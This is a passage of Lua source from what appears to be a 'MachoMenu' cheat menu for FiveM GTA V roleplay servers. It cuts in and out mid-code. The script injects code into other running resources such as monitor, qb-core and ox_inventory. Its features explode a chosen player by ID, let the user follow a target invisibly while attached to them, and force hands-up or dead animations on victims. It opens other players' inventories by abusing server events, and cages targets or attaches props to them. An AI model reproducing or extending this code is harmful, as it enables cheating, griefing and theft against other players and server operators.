        MachoMenuNotification("Explode M1", "Explosion sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- S1 Explode Player Method 2 (Volatus Drop)
local ExplodeMethod2InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M2)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 2", function()
    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod2InputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Explode M2", "Exploding player ID: " .. targetId)
        
local targetResource = nil
if GetResourceState('monitor') == "started" then
    targetResource = 'monitor'
elseif GetResourceState('qb-core') == "started" then
    targetResource = 'qb-core'
elseif GetResourceState('es_extended') == "started" then
    targetResource = 'es_extended'
elseif GetResourceState('m3-apartments') == "started" then
    targetResource = 'm3-apartments'
elseif GetResourceState('m3-inventory') == "started" then
    targetResource = 'm3-inventory'
elseif GetResourceState('m3-hud') == "started" then
    targetResource = 'm3-hud'
elseif GetResourceState('ox_inventory') == "started" then
    targetResource = 'ox_inventory'
else
    targetResource = 'qb-core' -- fallback
end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M2: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M2: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M2: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M2: Exploding " .. GetPlayerName(targetPlayer))
            
            local veh = GetHashKey("volatus")
            RequestModel(veh)
            local timeout = 0
            while not HasModelLoaded(veh) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(veh) then
                local coords = GetEntityCoords(targetPed)
                local vehh = CreateVehicle(veh, coords.x, coords.y, coords.z + 30, 0.0, true, true)
                Wait(1000)
                SetEntityVisible(vehh, false, false)
                SetVehicleEngineHealth(vehh, -4000.0)
                SetVehicleBodyHealth(vehh, 0.0)
                SetVehicleFuelLevel(vehh, 1000.0)
                SetEntityVelocity(vehh, 0.0, 0.0, -80.0)
                Wait(400)
                
                if DoesEntityExist(vehh) then
                    DeleteEntity(vehh)
                end
                
                SetModelAsNoLongerNeeded(veh)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M2: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Exploded ' .. targetName .. ' Method 2' } })
            else
                print("Explode M2: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Failed to load model!' } })
            end
        ]], targetId, targetId, targetId))
        
        MachoMenuNotification("Explode M2", "Explosion sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- S1 Explode Player Method 3 (Owned Explosion)
local ExplodeMethod3InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M3)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 3", function()
    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod3InputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Explode M3", "Exploding player ID: " .. targetId)
        
local targetResource = nil
if GetResourceState('monitor') == "started" then
    targetResource = 'monitor'
elseif GetResourceState('qb-core') == "started" then
    targetResource = 'qb-core'
elseif GetResourceState('es_extended') == "started" then
    targetResource = 'es_extended'
elseif GetResourceState('m3-apartments') == "started" then
    targetResource = 'm3-apartments'
elseif GetResourceState('m3-inventory') == "started" then
    targetResource = 'm3-inventory'
elseif GetResourceState('m3-hud') == "started" then
    targetResource = 'm3-hud'
elseif GetResourceState('ox_inventory') == "started" then
    targetResource = 'ox_inventory'
else
    targetResource = 'qb-core' -- fallback
end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M3: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M3: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M3: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M3: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            AddOwnedExplosion(PlayerPedId(), coords.x, coords.y, coords.z, 10, 1.0, true, false, 1.0)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Explode M3: Exploded " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Exploded ' .. targetName .. ' Method 3' } })
        ]], targetId, targetId, targetId))
        
        MachoMenuNotification("Explode M3", "Explosion sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

local robbing = false
local takip = false
local attachedTo = nil
local attachedTo2 = nil
local attachedTo3 = nil
local originalPos = nil
local originalPos2 = nil
local originalPos3 = nil
local isInvisible = false
local isInvisible2 = false
local isInvisible3 = false

-- Invisibility Function
local function SetTrueInvisibility(state)
    local playerPed = PlayerPedId()
    if state then
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)
        isInvisible = true
    else
        SetEntityVisible(playerPed, true, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        ResetEntityAlpha(playerPed)
        isInvisible = false
    end
end

-- Stay visible to self
CreateThread(function()
    while true do
        Wait(0)
        if isInvisible then
            local ped = PlayerPedId()
            SetEntityLocallyVisible(ped)
            SetEntityAlpha(ped, 255, false)
        end
    end
end)

-- MachoMenu inputbox
local takipInput = MachoMenuInputbox(PlayerManipSection, "Follow ID", "Target Player ID")

-- FOLLOW button
MachoMenuButton(PlayerManipSection, "Follow/Leave", function()
    if takip then
        local playerPed = PlayerPedId()
        takip = false
        DetachEntity(playerPed, true, false)
        SetTrueInvisibility(false)
        if DoesEntityExist(attachedTo2) then
            ClearPedTasks(attachedTo2)
        end
        attachedTo2 = nil
        if originalPos2 then
            SetEntityCoords(playerPed, originalPos2.x, originalPos2.y, originalPos2.z, false, false, false, false)
        end
        MachoInjectResource('monitor', [[
            local playerPed = PlayerPedId()
            local playerVeh = GetVehiclePedIsIn(playerPed, false)
    
            -- Make visible
            SetEntityVisible(playerPed, true, false)
            NetworkSetEntityInvisibleToNetwork(playerPed, false)
            ResetEntityAlpha(playerPed)
    
            if playerVeh ~= 0 then
                SetEntityVisible(playerVeh, true, false)
                NetworkSetEntityInvisibleToNetwork(playerVeh, false)
                ResetEntityAlpha(playerVeh)
            end
        ]])
        isInvisible2 = false
        MachoMenuNotification("Follow", "Follow left and returned.")
        return
    end

    local targetId = tonumber(MachoMenuGetInputbox(takipInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid ID!")
        return
    end

    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Error", "Player not found.")
        return
    end

    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(playerId)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target ped doesn't exist.")
        return
    end

    takip = true
    attachedTo2 = targetPed
    originalPos2 = GetEntityCoords(playerPed)

    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]])
    isInvisible2 = true

    AttachEntityToEntity(playerPed, targetPed, 11816, 0.5, -2.0, 2.0, 0.0, 0.0, 0.0, false, false, false, false, 1, true)

    -- Follow monitoring thread
    CreateThread(function()
        while takip do
            Wait(5)
            if IsPauseMenuActive() then
                takip = false
                DetachEntity(playerPed, true, false)
                SetTrueInvisibility(false)
                if DoesEntityExist(attachedTo2) then
                    ClearPedTasks(attachedTo2)
                end
                if originalPos then
                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
                end
                attachedTo2 = nil
                MachoMenuNotification("Follow", "Follow ended, returned to position.")
            end

            if isInvisible2 then
                local playerPed = PlayerPedId()
    
                SetEntityVisible(playerPed, false, false)
                NetworkSetEntityInvisibleToNetwork(playerPed, true)
                SetEntityAlpha(playerPed, 0, false)
    
                SetEntityLocallyVisible(playerPed)
                SetEntityAlpha(playerPed, 255, false)
            end
        end
    end)
end)

-- FOLLOW AND OPEN INVENTORY button
MachoMenuButton(PlayerManipSection, "Follow and Open Inventory / Leave", function()
    if robbing then
        local playerPed = PlayerPedId()
        robbing = false
        DetachEntity(playerPed, true, false)
        SetTrueInvisibility(false)
        if DoesEntityExist(attachedTo) then
            ClearPedTasks(attachedTo)
        end
        attachedTo = nil
        if originalPos then
            SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
        end
        -- Reset visibility settings
        SetEntityVisible(playerPed, true, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        ResetEntityAlpha(playerPed)
        isInvisible3 = false
        MachoMenuNotification("Follow", "Follow left and returned.")
        return
    end

    local targetId = tonumber(MachoMenuGetInputbox(takipInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid ID!")
        return
    end

    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Error", "Player not found.")
        return
    end

    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(playerId)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target ped doesn't exist.")
        return
    end

    robbing = true
    attachedTo = targetPed
    originalPos = GetEntityCoords(playerPed)

    -- Invisibility settings
    SetEntityVisible(playerPed, false, false)
    NetworkSetEntityInvisibleToNetwork(playerPed, true)
    SetEntityAlpha(playerPed, 0, false)

    isInvisible3 = true

    AttachEntityToEntity(playerPed, targetPed, 11816, 0.5, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)

    -- Animation
    local dict, anim = "missminuteman_1ig_2", "handsup_base"
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do Wait(0) end
    TaskPlayAnim(targetPed, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)

    -- Follow monitoring thread
    CreateThread(function()
        while robbing do
            Wait(5)
            if IsPauseMenuActive() then
                robbing = false
                DetachEntity(playerPed, true, false)
                SetTrueInvisibility(false)
                if DoesEntityExist(attachedTo) then
                    ClearPedTasks(attachedTo)
                end
                if originalPos then
                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
                end
                attachedTo = nil
                isInvisible3 = false
                MachoMenuNotification("Follow", "Follow ended, returned to position.")
            end
            if isInvisible3 then
                local playerPed55 = PlayerPedId()
    
                SetEntityVisible(playerPed55, false, false)
                NetworkSetEntityInvisibleToNetwork(playerPed55, true)
                SetEntityAlpha(playerPed55, 0, false)
    
                SetEntityLocallyVisible(playerPed55)
                SetEntityAlpha(playerPed55, 255, false)
            end
        end
    end)

    -- Open inventory (try twice)
    TriggerEvent('ox_inventory:openInventory', 'otherplayer', targetId)
end)

-- Open Nearby Player's Inventory (OX Version - keeps working)
MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (OX)", function()
    MachoInjectResource('m3-inventory', [[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local function ForceAnimationOnPlayer(ped)
            local dict = "dead"
            local anim = "dead_a"

            if not HasAnimDictLoaded(dict) then
                RequestAnimDict(dict)
                while not HasAnimDictLoaded(dict) do
                    Wait(10)
                end
            end

            TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local targetPed = GetPlayerPed(closestPlayer)
            ForceAnimationOnPlayer(targetPed)
            TriggerEvent('m3-inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
        else
            TriggerEvent('chat:addMessage', { args = { '^1Inventory:', 'No nearby player found!' } })
        end
    ]])
end)

-- Open Nearby Player's Inventory (QB Version - instant like OX)
MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (QB)", function()
    MachoInjectResource('monitor', [[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local serverId = GetPlayerServerId(closestPlayer)
            -- Try QB inventory event
            TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", serverId)
            
            -- Show notification
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~g~Opened inventory of nearby player!~w~ (ID: " .. serverId .. ")")
            DrawNotification(false, false)
        else
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~r~No nearby player found!")
            DrawNotification(false, false)
        end
    ]])
end)

-- Open Specific Player's Inventory (QB) - with ID input
local QBPlayerIDInput = MachoMenuInputbox(PlayerManipSection, "QB Player ID to Open", "e.g., 123")
MachoMenuButton(PlayerManipSection, "Open QB Player Inventory (By ID)", function()
    local playerId = MachoMenuGetInputbox(QBPlayerIDInput)
    
    if playerId and playerId ~= '' then
        local targetId = tonumber(playerId)
        if targetId and targetId > 0 then
            MachoInjectResource('monitor', string.format([[
                TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", %d)
                
                SetNotificationTextEntry("STRING")
                AddTextComponentString("~g~Opened inventory for player ID: ~b~" .. %d)
                DrawNotification(false, false)
            ]], targetId, targetId))
            MachoMenuNotification("QB Inventory", "Opening inventory for player ID: " .. targetId)
        else
            MachoMenuNotification("Error", "Please enter a valid player ID!")
        end
    else
        MachoMenuNotification("Error", "Please enter a player ID!")
    end
end)

-- ============================================================
-- S1 ATTACH JET (Selected Player)
-- ============================================================

local AttachJetInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Jet)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Attach Jet", function()
    local targetId = tonumber(MachoMenuGetInputbox(AttachJetInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Attach Jet", "Attaching jet to ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Jet: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Jet: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Jet: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_med_jet_01")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Jet: Attached jet to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Jet:', 'Attached jet to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Jet: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Failed to load object model!' } })
            end
        ]], targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- ============================================================
-- S1 ATTACH BOX (Selected Player)
-- ============================================================

local AttachBoxInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Box)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Attach Box", function()
    local targetId = tonumber(MachoMenuGetInputbox(AttachBoxInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Attach Box", "Attaching box to ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Box: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Box: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Box: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("xm3_prop_xm3_box_wood03a")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Box: Attached box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Box:', 'Attached box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Box: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Failed to load object model!' } })
            end
        ]], targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- ============================================================
-- S1 ATTACH CONE (Selected Player)
-- ============================================================

local AttachConeInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Cone)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Attach Cone", function()
    local targetId = tonumber(MachoMenuGetInputbox(AttachConeInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Attach Cone", "Attaching cone to ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Cone: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Cone: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Cone: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_roadcone01b")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Cone: Attached cone to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Cone:', 'Attached cone to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Cone: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Failed to load object model!' } })
            end
        ]], targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- ============================================================
-- S1 ATTACH JUKE BOX (Selected Player)
-- ============================================================

local AttachJukeInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Juke)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Attach Juke Box", function()
    local targetId = tonumber(MachoMenuGetInputbox(AttachJukeInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Attach Juke", "Attaching juke box to ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Juke: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Juke: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Juke: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_jukebox_02")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Juke: Attached juke box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Juke:', 'Attached juke box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Juke: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Failed to load object model!' } })
            end
        ]], targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Cage Player function
function CagePlayer(player)
    local ped = GetPlayerPed(player)
    if not ped or ped <= 0 then 
        MachoMenuNotification("Error!", "Invalid player ped.")
        return 
    end

    local coords = GetEntityCoords(ped)
    if not coords then 
        MachoMenuNotification("Error!", "Could not get player coordinates.")
        return 
    end

    local inveh = IsPedInAnyVehicle(ped)

    if inveh then
        -- Cage created while in vehicle
        local obj = CreateObject(GetHashKey("prop_metal_detector"), coords.x - 6.8, coords.y + 1, coords.z - 1.5, false, true, true)
        SetEntityHeading(obj, 90.0)
        
        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, false, true, true)
        
        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, false, true, true)

        local obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, false, true, true)
        SetEntityHeading(obj2, 90.0)
        
        obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z + 1.3, false, true, true)
        SetEntityHeading(obj, 90.0)
        
        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, false, true, true)
        
        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, false, true, true)

        obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, false, true, true)
        SetEntityHeading(obj2, 90.0)
    else
        -- Cage created outside vehicle
        local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, true, true, true)
        FreezeEntityPosition(obj, true)
        
        local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, true, true, true)
        SetEntityHeading(obj2, 90.0)
        FreezeEntityPosition(obj2, true)
        
        local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, true, true, true)
        FreezeEntityPosition(obj3, true)
        
        local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, true, true, true)
        SetEntityHeading(obj4, 90.0)
        FreezeEntityPosition(obj4, true)
        
        local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, true, true, true)
        FreezeEntityPosition(obj5, true)
        
        local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, true, true, true)
        SetEntityHeading(obj6, 90.0)
        FreezeEntityPosition(obj6, true)
        
        local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, true, true, true)
        FreezeEntityPosition(obj7, true)
        
        local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, true, true, true)
        SetEntityHeading(obj8, 90.0)
        FreezeEntityPosition(obj8, true)
    end
end

-- MachoMenu Button and Input Box
local CageTargetIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Cage Target Player ID", "e.g., 123")

MachoMenuButton(VehicleNPCSection, "Cage Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(CageTargetIdInputBoxHandle))
    if targetId and targetId > 0 then
        MachoInjectResource('monitor', string.format([[
            local targetClientId = GetPlayerFromServerId(%d)
            if targetClientId == -1 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Player not found! ID: %d' } })
                return
            end
            local ped = GetPlayerPed(targetClientId)
            if not ped or ped <= 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Invalid player ped! ID: %d' } })
                return
            end
            local coords = GetEntityCoords(ped)
            if not coords then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Could not get coordinates! ID: %d' } })
                return
            end
            local inveh = IsPedInAnyVehicle(ped)
            if inveh then
